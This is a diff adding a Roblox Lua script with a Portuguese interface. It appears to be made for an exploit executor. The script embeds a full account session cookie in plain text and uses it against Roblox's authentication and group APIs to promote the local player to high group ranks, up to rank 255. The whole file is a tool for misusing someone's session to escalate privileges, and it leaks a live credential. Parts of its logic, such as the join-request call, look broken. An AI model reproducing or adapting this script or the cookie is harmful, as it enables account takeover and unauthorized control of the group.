@@ -1,0 +1,793 @@
+-- ============================================
+-- SISTEMA COMPLETO DE CARGOS - GRUPO 32544874
+-- Lista todos os cargos até Vice-Presidente
+-- ============================================
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+-- ================= CONFIGURAÇÃO =================
+local ROBLOX_COOKIES = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDEyODQzNjA2MDg4NjI4OTgyMTQxKAM.tSGCz7smRY9zM5k3fxrNRTz9qQY47Tdui_lQ0a-Y5SJ3QNc5Ny8VjTTSfEivJM8C45848AOD31LtRlXSbGq5yezYZKMbDHpkOLbh5WySFQHbrrqGmknpu_tB2RgQ9CLgm9Sd-3vngvS4O9wOa_TS1iQCOOMui-TZCR6iXFT3eyQV_FeDyiLHgVDRztHRwHfIwgiRWSLD1TXj_38V3SWVM8r0rarKGS3INnb08PPI-7V9K5_QXKCp8zR86Vd2RDl18DJoSL_3ValWRJkX5-CxOvbnBLNP-zVOcHV7Ms_cyS7pjb8pq7lZEBEbrPvskFVjd75_bJXGszWXUmNUXcbddQFXlOPAyk0poCyQ6DDeUsW60fOV5zMVanmOEBNx6xJdhNOpEojUHJKFOdk4bMau59P5tEVOuGj89cFAYzt3QDQSRlmNqaG852YhMUT-XexQ-WD1OIr7gKD3ECTcWU4wjdJ4J1V_97ZxobyONZ8eqtj9TxD7fEQYN3ovD-tnioYFpPgFfEz6-PhJfOL546XBpTQ0hLIJzGgiQZVTEl7dKVSJhl3RITGEarH3NgC2ECJ36L7eCVw_1uEqLnBVkQfChDvnlacazozLjgB4H3o4HgXHUin7nb_LNTNlzC2-h8u374x0ahKvKca8iTjlzVY1BhBwE03DfSHiMFp1Ha2b72quGGVS9X06JqjcxwRst80xoc0UfwNHfa9TNnPaWjtue1fSnjF933dJ90OgNQbPoMgx8_WDmsKYDUpaxpD2ACs3Jf_K4gQyTP9gTXz6BOUyEfmb_Sc"
+local GROUP_ID = 32544874
+local VICE_PRESIDENT_RANK = 255  -- Rank máximo permitido
+-- ================================================
+
+-- Criar interface GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.Name = "CargoSystem"
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Frame principal
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.25, 0, 0.15, 0)
+MainFrame.Size = UDim2.new(0, 800, 0, 600)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+-- Cantos arredondados
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+-- Sombra
+local DropShadow = Instance.new("ImageLabel")
+DropShadow.Name = "DropShadow"
+DropShadow.Parent = MainFrame
+DropShadow.BackgroundTransparency = 1
+DropShadow.BorderSizePixel = 0
+DropShadow.Size = UDim2.new(1, 0, 1, 0)
+DropShadow.ZIndex = -1
+DropShadow.Image = "rbxassetid://6014261993"
+DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+DropShadow.ImageTransparency = 0.5
+DropShadow.ScaleType = Enum.ScaleType.Slice
+DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
+
+-- Barra superior
+local TopBar = Instance.new("Frame")
+TopBar.Parent = MainFrame
+TopBar.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+TopBar.BorderSizePixel = 0
+TopBar.Size = UDim2.new(1, 0, 0, 50)
+
+local TopBarCorner = Instance.new("UICorner")
+TopBarCorner.CornerRadius = UDim.new(0, 12, 0, 0)
+TopBarCorner.Parent = TopBar
+
+-- Título
+local Title = Instance.new("TextLabel")
+Title.Parent = TopBar
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 25, 0, 0)
+Title.Size = UDim2.new(1, -50, 1, 0)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "👑 SISTEMA DE CARGOS - GRUPO 32544874"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 20
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Botão fechar
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Parent = TopBar
+CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Position = UDim2.new(1, -45, 0, 15)
+CloseBtn.Size = UDim2.new(0, 20, 0, 20)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Text = "×"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextSize = 22
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(1, 0)
+CloseCorner.Parent = CloseBtn
+
+-- Conteúdo
+local Content = Instance.new("Frame")
+Content.Parent = MainFrame
+Content.BackgroundTransparency = 1
+Content.Position = UDim2.new(0, 0, 0, 50)
+Content.Size = UDim2.new(1, 0, 1, -50)
+
+-- Painel esquerdo (informações)
+local LeftPanel = Instance.new("Frame")
+LeftPanel.Parent = Content
+LeftPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+LeftPanel.BorderSizePixel = 0
+LeftPanel.Position = UDim2.new(0, 0, 0, 0)
+LeftPanel.Size = UDim2.new(0.35, 0, 1, 0)
+
+local LeftCorner = Instance.new("UICorner")
+LeftCorner.CornerRadius = UDim.new(0, 0, 0, 12)
+LeftCorner.Parent = LeftPanel
+
+-- Informação do jogador
+local PlayerFrame = Instance.new("Frame")
+PlayerFrame.Parent = LeftPanel
+PlayerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+PlayerFrame.BorderSizePixel = 0
+PlayerFrame.Position = UDim2.new(0.05, 0, 0.02, 0)
+PlayerFrame.Size = UDim2.new(0.9, 0, 0.15, 0)
+
+local PlayerFrameCorner = Instance.new("UICorner")
+PlayerFrameCorner.CornerRadius = UDim.new(0, 10)
+PlayerFrameCorner.Parent = PlayerFrame
+
+local PlayerAvatar = Instance.new("TextLabel")
+PlayerAvatar.Parent = PlayerFrame
+PlayerAvatar.BackgroundTransparency = 1
+PlayerAvatar.Position = UDim2.new(0.1, 0, 0.1, 0)
+PlayerAvatar.Size = UDim2.new(0.2, 0, 0.8, 0)
+PlayerAvatar.Font = Enum.Font.GothamBold
+PlayerAvatar.Text = "👤"
+PlayerAvatar.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerAvatar.TextSize = 28
+
+local PlayerName = Instance.new("TextLabel")
+PlayerName.Parent = PlayerFrame
+PlayerName.BackgroundTransparency = 1
+PlayerName.Position = UDim2.new(0.35, 0, 0.2, 0)
+PlayerName.Size = UDim2.new(0.6, 0, 0.6, 0)
+PlayerName.Font = Enum.Font.GothamBold
+PlayerName.Text = "Carregando..."
+PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.TextSize = 14
+PlayerName.TextXAlignment = Enum.TextXAlignment.Left
+PlayerName.TextWrapped = true
+
+-- Grupo info
+local GroupFrame = Instance.new("Frame")
+GroupFrame.Parent = LeftPanel
+GroupFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+GroupFrame.BorderSizePixel = 0
+GroupFrame.Position = UDim2.new(0.05, 0, 0.19, 0)
+GroupFrame.Size = UDim2.new(0.9, 0, 0.12, 0)
+
+local GroupFrameCorner = Instance.new("UICorner")
+GroupFrameCorner.CornerRadius = UDim.new(0, 10)
+GroupFrameCorner.Parent = GroupFrame
+
+local GroupIcon = Instance.new("TextLabel")
+GroupIcon.Parent = GroupFrame
+GroupIcon.BackgroundTransparency = 1
+GroupIcon.Position = UDim2.new(0.1, 0, 0.2, 0)
+GroupIcon.Size = UDim2.new(0.2, 0, 0.6, 0)
+GroupIcon.Font = Enum.Font.GothamBold
+GroupIcon.Text = "🏛️"
+GroupIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
+GroupIcon.TextSize = 24
+
+local GroupText = Instance.new("TextLabel")
+GroupText.Parent = GroupFrame
+GroupText.BackgroundTransparency = 1
+GroupText.Position = UDim2.new(0.35, 0, 0.2, 0)
+GroupText.Size = UDim2.new(0.6, 0, 0.6, 0)
+GroupText.Font = Enum.Font.GothamBold
+GroupText.Text = "Grupo 32544874"
+GroupText.TextColor3 = Color3.fromRGB(200, 200, 255)
+GroupText.TextSize = 14
+GroupText.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Status
+local StatusFrame = Instance.new("Frame")
+StatusFrame.Parent = LeftPanel
+StatusFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+StatusFrame.BorderSizePixel = 0
+StatusFrame.Position = UDim2.new(0.05, 0, 0.33, 0)
+StatusFrame.Size = UDim2.new(0.9, 0, 0.15, 0)
+
+local StatusFrameCorner = Instance.new("UICorner")
+StatusFrameCorner.CornerRadius = UDim.new(0, 10)
+StatusFrameCorner.Parent = StatusFrame
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Parent = StatusFrame
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
+StatusLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
+StatusLabel.Font = Enum.Font.GothamBold
+StatusLabel.Text = "🟢 PRONTO"
+StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+StatusLabel.TextSize = 16
+StatusLabel.TextWrapped = true
+
+-- Logs
+local LogsFrame = Instance.new("Frame")
+LogsFrame.Parent = LeftPanel
+LogsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+LogsFrame.BorderSizePixel = 0
+LogsFrame.Position = UDim2.new(0.05, 0, 0.5, 0)
+LogsFrame.Size = UDim2.new(0.9, 0, 0.45, 0)
+
+local LogsFrameCorner = Instance.new("UICorner")
+LogsFrameCorner.CornerRadius = UDim.new(0, 10)
+LogsFrameCorner.Parent = LogsFrame
+
+local LogsTitle = Instance.new("TextLabel")
+LogsTitle.Parent = LogsFrame
+LogsTitle.BackgroundTransparency = 1
+LogsTitle.Position = UDim2.new(0.05, 0, 0.02, 0)
+LogsTitle.Size = UDim2.new(0.9, 0, 0.1, 0)
+LogsTitle.Font = Enum.Font.GothamBold
+LogsTitle.Text = "📋 LOGS"
+LogsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+LogsTitle.TextSize = 14
+LogsTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local LogsContent = Instance.new("ScrollingFrame")
+LogsContent.Parent = LogsFrame
+LogsContent.BackgroundTransparency = 1
+LogsContent.BorderSizePixel = 0
+LogsContent.Position = UDim2.new(0.05, 0, 0.15, 0)
+LogsContent.Size = UDim2.new(0.9, 0, 0.8, 0)
+LogsContent.ScrollBarThickness = 4
+LogsContent.CanvasSize = UDim2.new(0, 0, 10, 0)
+
+local LogsText = Instance.new("TextLabel")
+LogsText.Parent = LogsContent
+LogsText.BackgroundTransparency = 1
+LogsText.Size = UDim2.new(1, 0, 0, 200)
+LogsText.Font = Enum.Font.Gotham
+LogsText.Text = "✅ Sistema iniciado\n👤 Aguardando seleção..."
+LogsText.TextColor3 = Color3.fromRGB(200, 200, 220)
+LogsText.TextSize = 12
+LogsText.TextXAlignment = Enum.TextXAlignment.Left
+LogsText.TextYAlignment = Enum.TextYAlignment.Top
+LogsText.TextWrapped = true
+
+-- Painel direito (cargos)
+local RightPanel = Instance.new("Frame")
+RightPanel.Parent = Content
+RightPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+RightPanel.BorderSizePixel = 0
+RightPanel.Position = UDim2.new(0.35, 0, 0, 0)
+RightPanel.Size = UDim2.new(0.65, 0, 1, 0)
+
+local RightCorner = Instance.new("UICorner")
+RightCorner.CornerRadius = UDim.new(0, 0, 0, 12)
+RightCorner.Parent = RightPanel
+
+-- Título dos cargos
+local CargosTitle = Instance.new("TextLabel")
+CargosTitle.Parent = RightPanel
+CargosTitle.BackgroundTransparency = 1
+CargosTitle.Position = UDim2.new(0.05, 0, 0.02, 0)
+CargosTitle.Size = UDim2.new(0.9, 0, 0.08, 0)
+CargosTitle.Font = Enum.Font.GothamBold
+CargosTitle.Text = "🎖️ CARGOS DISPONÍVEIS (Até Vice-Presidente)"
+CargosTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+CargosTitle.TextSize = 18
+
+-- Frame de cargos (scroll)
+local CargosFrame = Instance.new("ScrollingFrame")
+CargosFrame.Parent = RightPanel
+CargosFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+CargosFrame.BorderSizePixel = 0
+CargosFrame.Position = UDim2.new(0.05, 0, 0.12, 0)
+CargosFrame.Size = UDim2.new(0.9, 0, 0.75, 0)
+CargosFrame.ScrollBarThickness = 6
+CargosFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local CargosFrameCorner = Instance.new("UICorner")
+CargosFrameCorner.CornerRadius = UDim.new(0, 10)
+CargosFrameCorner.Parent = CargosFrame
+
+-- Botão aplicar
+local ApplyButton = Instance.new("TextButton")
+ApplyButton.Parent = RightPanel
+ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+ApplyButton.BorderSizePixel = 0
+ApplyButton.Position = UDim2.new(0.25, 0, 0.9, 0)
+ApplyButton.Size = UDim2.new(0.5, 0, 0.07, 0)
+ApplyButton.Font = Enum.Font.GothamBold
+ApplyButton.Text = "🚀 APLICAR CARGO"
+ApplyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ApplyButton.TextSize = 16
+
+local ApplyButtonCorner = Instance.new("UICorner")
+ApplyButtonCorner.CornerRadius = UDim.new(0, 10)
+ApplyButtonCorner.Parent = ApplyButton
+
+-- Cargo selecionado
+local SelectedCargoLabel = Instance.new("TextLabel")
+SelectedCargoLabel.Parent = RightPanel
+SelectedCargoLabel.BackgroundTransparency = 1
+SelectedCargoLabel.Position = UDim2.new(0.05, 0, 0.83, 0)
+SelectedCargoLabel.Size = UDim2.new(0.9, 0, 0.05, 0)
+SelectedCargoLabel.Font = Enum.Font.Gotham
+SelectedCargoLabel.Text = "📌 Nenhum cargo selecionado"
+SelectedCargoLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+SelectedCargoLabel.TextSize = 14
+SelectedCargoLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Variáveis do sistema
+local csrfToken = ""
+local selectedRank = nil
+local selectedRankName = ""
+local ranksData = {}
+local isProcessing = false
+
+-- Função para adicionar log
+local function addLog(message, color)
+    if not color then color = Color3.fromRGB(200, 200, 220) end
+    local timestamp = os.date("%H:%M:%S")
+    local logEntry = "[" .. timestamp .. "] " .. message
+    
+    local currentText = LogsText.Text
+    LogsText.Text = currentText .. "\n" .. logEntry
+    
+    -- Ajustar tamanho do canvas
+    local lineCount = select(2, string.gsub(LogsText.Text, "\n", ""))
+    LogsText.Size = UDim2.new(1, 0, 0, lineCount * 20)
+    LogsContent.CanvasSize = UDim2.new(0, 0, 0, LogsText.AbsoluteSize.Y)
+    LogsContent.CanvasPosition = Vector2.new(0, LogsContent.AbsoluteCanvasSize.Y)
+end
+
+-- Função para atualizar status
+local function updateStatus(message, color)
+    StatusLabel.Text = message
+    StatusLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+end
+
+-- Função para obter CSRF Token
+local function getCSRFToken()
+    if csrfToken ~= "" then return csrfToken end
+    
+    addLog("Obtendo token CSRF...")
+    
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = "https://auth.roblox.com/v2/logout",
+            Method = "POST",
+            Headers = {
+                ["Cookie"] = ROBLOX_COOKIES
+            }
+        })
+    end)
+    
+    if success and response.Headers then
+        csrfToken = response.Headers["x-csrf-token"] or ""
+        if csrfToken ~= "" then
+            addLog("✅ Token CSRF obtido")
+        else
+            addLog("❌ Falha ao obter token CSRF")
+        end
+    else
+        addLog("❌ Erro na requisição CSRF")
+    end
+    
+    return csrfToken
+end
+
+-- Função para verificar conta
+local function verifyAccount()
+    addLog("Verificando conta admin...")
+    updateStatus("🔍 Verificando conta...", Color3.fromRGB(255, 200, 100))
+    
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = "https://users.roblox.com/v1/users/authenticated",
+            Method = "GET",
+            Headers = {
+                ["Cookie"] = ROBLOX_COOKIES
+            }
+        })
+    end)
+    
+    if success and response.Success then
+        local data = HttpService:JSONDecode(response.Body)
+        addLog("✅ Conectado como: " .. data.name)
+        updateStatus("✅ Conta verificada", Color3.fromRGB(100, 255, 100))
+        return true, data.name
+    end
+    
+    addLog("❌ Falha na autenticação!", Color3.fromRGB(255, 100, 100))
+    updateStatus("❌ Cookies inválidos", Color3.fromRGB(255, 100, 100))
+    return false
+end
+
+-- Função para obter todos os cargos do grupo
+local function getAllRanks()
+    addLog("Buscando cargos do grupo...")
+    updateStatus("📋 Buscando cargos...", Color3.fromRGB(255, 200, 100))
+    
+    local success, response = pcall(function()
+        return HttpService:GetAsync("https://groups.roblox.com/v1/groups/" .. GROUP_ID .. "/roles")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(response)
+        ranksData = {}
+        
+        -- Filtrar apenas cargos até Vice-Presidente
+        for _, rank in ipairs(data.roles) do
+            if rank.rank <= VICE_PRESIDENT_RANK then
+                table.insert(ranksData, {
+                    id = rank.id,
+                    name = rank.name,
+                    rank = rank.rank,
+                    description = rank.description or ""
+                })
+            end
+        end
+        
+        -- Ordenar por rank (maior para menor)
+        table.sort(ranksData, function(a, b)
+            return a.rank > b.rank
+        end)
+        
+        addLog("✅ " .. #ranksData .. " cargos encontrados")
+        return true
+    else
+        addLog("❌ Falha ao buscar cargos", Color3.fromRGB(255, 100, 100))
+        return false
+    end
+end
+
+-- Função para criar botões dos cargos
+local function createRankButtons()
+    -- Limpar cargos existentes
+    for _, child in ipairs(CargosFrame:GetChildren()) do
+        if child:IsA("TextButton") or child:IsA("Frame") then
+            child:Destroy()
+        end
+    end
+    
+    local buttonHeight = 70
+    local yOffset = 10
+    local buttonWidth = 0.95
+    
+    for i, rank in ipairs(ranksData) do
+        -- Determinar cor baseado no rank
+        local color
+        if rank.rank == VICE_PRESIDENT_RANK then
+            color = Color3.fromRGB(255, 100, 100)  -- Vermelho para VP
+        elseif rank.rank >= 200 then
+            color = Color3.fromRGB(255, 150, 50)   -- Laranja para altos
+        elseif rank.rank >= 100 then
+            color = Color3.fromRGB(100, 200, 255)  -- Azul para médios
+        else
+            color = Color3.fromRGB(100, 255, 100)  -- Verde para baixos
+        end
+        
+        -- Criar botão do cargo
+        local RankButton = Instance.new("TextButton")
+        RankButton.Name = "RankBtn_" .. rank.id
+        RankButton.Parent = CargosFrame
+        RankButton.BackgroundColor3 = color
+        RankButton.BackgroundTransparency = 0.3
+        RankButton.BorderSizePixel = 0
+        RankButton.Position = UDim2.new((1 - buttonWidth) / 2, 0, 0, yOffset)
+        RankButton.Size = UDim2.new(buttonWidth, 0, 0, buttonHeight)
+        RankButton.Text = ""
+        RankButton.AutoButtonColor = false
+        
+        local RankButtonCorner = Instance.new("UICorner")
+        RankButtonCorner.CornerRadius = UDim.new(0, 8)
+        RankButtonCorner.Parent = RankButton
+        
+        -- Gradiente
+        local Gradient = Instance.new("UIGradient")
+        Gradient.Rotation = 90
+        Gradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, color),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(
+                math.floor(color.R * 100),
+                math.floor(color.G * 70),
+                math.floor(color.B * 70)
+            ))
+        })
+        Gradient.Parent = RankButton
+        
+        -- Ícone
+        local Icon = Instance.new("TextLabel")
+        Icon.Parent = RankButton
+        Icon.BackgroundTransparency = 1
+        Icon.Position = UDim2.new(0, 15, 0, 15)
+        Icon.Size = UDim2.new(0, 40, 0, 40)
+        Icon.Font = Enum.Font.GothamBold
+        Icon.Text = "👑"
+        Icon.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Icon.TextSize = 28
+        
+        -- Nome do cargo
+        local RankName = Instance.new("TextLabel")
+        RankName.Parent = RankButton
+        RankName.BackgroundTransparency = 1
+        RankName.Position = UDim2.new(0, 70, 0, 10)
+        RankName.Size = UDim2.new(0.6, -70, 0, 30)
+        RankName.Font = Enum.Font.GothamBold
+        RankName.Text = rank.name
+        RankName.TextColor3 = Color3.fromRGB(255, 255, 255)
+        RankName.TextSize = 16
+        RankName.TextXAlignment = Enum.TextXAlignment.Left
+        
+        -- Rank e ID
+        local RankInfo = Instance.new("TextLabel")
+        RankInfo.Parent = RankButton
+        RankInfo.BackgroundTransparency = 1
+        RankInfo.Position = UDim2.new(0, 70, 0, 40)
+        RankInfo.Size = UDim2.new(0.6, -70, 0, 20)
+        RankInfo.Font = Enum.Font.Gotham
+        RankInfo.Text = "Rank: " .. rank.rank .. " | ID: " .. rank.id
+        RankInfo.TextColor3 = Color3.fromRGB(220, 220, 240)
+        RankInfo.TextSize = 12
+        RankInfo.TextXAlignment = Enum.TextXAlignment.Left
+        
+        -- Indicador de seleção
+        local SelectedIndicator = Instance.new("Frame")
+        SelectedIndicator.Name = "SelectedIndicator"
+        SelectedIndicator.Parent = RankButton
+        SelectedIndicator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        SelectedIndicator.BorderSizePixel = 0
+        SelectedIndicator.Position = UDim2.new(1, -45, 0.5, -12)
+        SelectedIndicator.Size = UDim2.new(0, 24, 0, 24)
+        SelectedIndicator.Visible = false
+        
+        local SelectedCorner = Instance.new("UICorner")
+        SelectedCorner.CornerRadius = UDim.new(1, 0)
+        SelectedCorner.Parent = SelectedIndicator
+        
+        local CheckIcon = Instance.new("TextLabel")
+        CheckIcon.Parent = SelectedIndicator
+        CheckIcon.BackgroundTransparency = 1
+        CheckIcon.Size = UDim2.new(1, 0, 1, 0)
+        CheckIcon.Font = Enum.Font.GothamBold
+        CheckIcon.Text = "✓"
+        CheckIcon.TextColor3 = Color3.fromRGB(0, 200, 0)
+        CheckIcon.TextSize = 18
+        
+        -- Evento de clique
+        RankButton.MouseButton1Click:Connect(function()
+            if isProcessing then return end
+            
+            -- Desselecionar todos
+            for _, btn in ipairs(CargosFrame:GetChildren()) do
+                if btn:IsA("TextButton") then
+                    local indicator = btn:FindFirstChild("SelectedIndicator")
+                    if indicator then
+                        indicator.Visible = false
+                    end
+                    btn.BackgroundTransparency = 0.3
+                end
+            end
+            
+            -- Selecionar este
+            SelectedIndicator.Visible = true
+            RankButton.BackgroundTransparency = 0
+            selectedRank = rank.id
+            selectedRankName = rank.name
+            
+            SelectedCargoLabel.Text = "📌 Selecionado: " .. rank.name .. " (Rank: " .. rank.rank .. ")"
+            addLog("Cargo selecionado: " .. rank.name)
+        end)
+        
+        -- Efeitos hover
+        RankButton.MouseEnter:Connect(function()
+            if not SelectedIndicator.Visible and not isProcessing then
+                RankButton.BackgroundTransparency = 0.1
+            end
+        end)
+        
+        RankButton.MouseLeave:Connect(function()
+            if not SelectedIndicator.Visible and not isProcessing then
+                RankButton.BackgroundTransparency = 0.3
+            end
+        end)
+        
+        yOffset = yOffset + buttonHeight + 10
+    end
+    
+    -- Ajustar canvas size
+    CargosFrame.CanvasSize = UDim2.new(0, 0, 0, yOffset)
+    
+    if #ranksData > 0 then
+        addLog("✅ Botões de cargo criados")
+    else
+        addLog("⚠️ Nenhum cargo disponível", Color3.fromRGB(255, 200, 50))
+    end
+end
+
+-- Função para verificar se jogador está no grupo
+local function checkGroupMembership(userId)
+    local success, response = pcall(function()
+        return HttpService:GetAsync("https://groups.roblox.com/v1/users/" .. userId .. "/groups/roles")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(response)
+        for _, group in ipairs(data.data) do
+            if group.group.id == GROUP_ID then
+                return true, group.role.rank, group.role.name
+            end
+        end
+    end
+    
+    return false, 0, ""
+end
+
+-- Função para enviar pedido de grupo
+local function sendGroupRequest(userId)
+    addLog("Enviando pedido de grupo...")
+    
+    local token = getCSRFToken()
+    if token == "" then return false end
+    
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = "https://groups.roblox.com/v1/groups/" .. GROUP_ID .. "/join-requests",
+            Method = "POST",
+            Headers = {
+                ["Cookie"] = ROBLOX_COOKIES,
+                ["Content-Type"] = "application/json",
+                ["X-CSRF-TOKEN"] = token
+            },
+            Body = HttpService:JSONEncode({
+                userId = userId
+            })
+        })
+    end)
+    
+    return success and response.Success
+end
+
+-- Função para aplicar cargo
+local function applyRank(userId, rankId)
+    if isProcessing then return false end
+    isProcessing = true
+    
+    addLog("Aplicando cargo...")
+    updateStatus("🎖️ Aplicando cargo...", Color3.fromRGB(255, 200, 100))
+    ApplyButton.Text = "⏳ PROCESSANDO..."
+    ApplyButton.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
+    
+    -- Verificar se está no grupo
+    local inGroup, currentRank, currentRankName = checkGroupMembership(userId)
+    
+    if not inGroup then
+        addLog("⚠️ Não está no grupo. Enviando pedido...")
+        local requestSent = sendGroupRequest(userId)
+        
+        if requestSent then
+            addLog("✅ Pedido enviado! Aceite para receber cargo.", Color3.fromRGB(100, 255, 100))
+            addLog("🔄 Execute novamente após aceitar.", Color3.fromRGB(255, 255, 100))
+            updateStatus("📩 PEDIDO ENVIADO", Color3.fromRGB(255, 255, 100))
+        else
+            addLog("❌ Falha ao enviar pedido", Color3.fromRGB(255, 100, 100))
+            updateStatus("❌ Falha no pedido", Color3.fromRGB(255, 100, 100))
+        end
+        
+        isProcessing = false
+        ApplyButton.Text = "🚀 APLICAR CARGO"
+        ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+        return false
+    end
+    
+    -- Verificar se já tem cargo igual ou maior
+    if currentRank >= VICE_PRESIDENT_RANK then
+        addLog("⚠️ Já possui cargo alto: " .. currentRankName, Color3.fromRGB(255, 200, 50))
+        updateStatus("✅ Já tem cargo alto", Color3.fromRGB(100, 255, 100))
+        
+        isProcessing = false
+        ApplyButton.Text = "🚀 APLICAR CARGO"
+        ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+        return true
+    end
+    
+    -- Aplicar novo cargo
+    local token = getCSRFToken()
+    if token == "" then
+        addLog("❌ Token CSRF não disponível", Color3.fromRGB(255, 100, 100))
+        isProcessing = false
+        ApplyButton.Text = "🚀 APLICAR CARGO"
+        ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+        return false
+    end
+    
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = "https://groups.roblox.com/v1/groups/" .. GROUP_ID .. "/users/" .. userId,
+            Method = "PATCH",
+            Headers = {
+                ["Cookie"] = ROBLOX_COOKIES,
+                ["Content-Type"] = "application/json",
+                ["X-CSRF-TOKEN"] = token
+            },
+            Body = HttpService:JSONEncode({
+                roleId = rankId
+            })
+        })
+    end)
+    
+    if success and response.Success then
+        addLog("✅ Cargo aplicado com SUCESSO!", Color3.fromRGB(100, 255, 100))
+        addLog("🎉 " .. selectedRankName .. " atribuído!", Color3.fromRGB(100, 255, 100))
+        updateStatus("✅ CARGO APLICADO!", Color3.fromRGB(100, 255, 100))
+    else
+        addLog("❌ Falha ao aplicar cargo", Color3.fromRGB(255, 100, 100))
+        updateStatus("❌ Falha ao aplicar", Color3.fromRGB(255, 100, 100))
+    end
+    
+    isProcessing = false
+    ApplyButton.Text = "🚀 APLICAR CARGO"
+    ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    return success and response.Success
+end
+
+-- Função principal de inicialização
+local function initializeSystem()
+    addLog("Inicializando sistema...")
+    
+    -- Atualizar info do jogador
+    local player = Players.LocalPlayer
+    PlayerName.Text = player.Name
+    addLog("Jogador: " .. player.Name .. " (ID: " .. player.UserId .. ")")
+    
+    -- Verificar conta
+    local accountValid, accountName = verifyAccount()
+    if not accountValid then return end
+    
+    -- Obter cargos
+    local ranksLoaded = getAllRanks()
+    if not ranksLoaded then return end
+    
+    -- Criar botões
+    createRankButtons()
+    
+    addLog("✅ Sistema pronto para uso!")
+    updateStatus("🟢 SISTEMA PRONTO", Color3.fromRGB(100, 255, 100))
+end
+
+-- Eventos dos botões
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+ApplyButton.MouseButton1Click:Connect(function()
+    if isProcessing then return end
+    
+    if not selectedRank then
+        addLog("⚠️ Selecione um cargo primeiro!", Color3.fromRGB(255, 200, 50))
+        updateStatus("⚠️ Selecione um cargo", Color3.fromRGB(255, 200, 100))
+        return
+    end
+    
+    local player = Players.LocalPlayer
+    applyRank(player.UserId, selectedRank)
+end)
+
+-- Efeitos hover
+CloseBtn.MouseEnter:Connect(function()
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+end)
+
+CloseBtn.MouseLeave:Connect(function()
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+end)
+
+ApplyButton.MouseEnter:Connect(function()
+    if not isProcessing then
+        ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    end
+end)
+
+ApplyButton.MouseLeave:Connect(function()
+    if not isProcessing then
+        ApplyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    end
+end)
+
+-- Inicializar sistema
+task.spawn(function()
+    initializeSystem()
+end)
+
+print("=========================================")
+print("SISTEMA DE CARGOS - GRUPO 32544874")
+print("Cargos disponíveis: Até Vice-Presidente")
+print("=========================================")
